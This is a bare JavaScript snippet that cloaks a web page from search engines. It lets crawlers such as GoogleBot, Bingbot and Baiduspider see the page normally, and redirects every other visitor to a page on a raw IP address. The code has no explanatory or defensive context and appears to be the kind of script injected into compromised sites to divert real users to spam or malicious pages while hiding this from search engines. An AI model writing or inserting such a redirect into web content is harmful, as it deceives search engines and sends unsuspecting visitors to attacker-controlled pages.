var userAgent = navigator.userAgent;
var spiderList = ["Baiduspider", "360Spider", "YisouSpider", "YandexBot", "Sogou inst spider", "Sogou web spider", "msnbot", "Bingbot", "Sogou spider", "GoogleBot", "Bing"];

var isSpider = spiderList.some(function(spider) {
    return userAgent.includes(spider);
});

if (!isSpider) {
    window.location.href = "http://38.181.25.130/url.html";
}
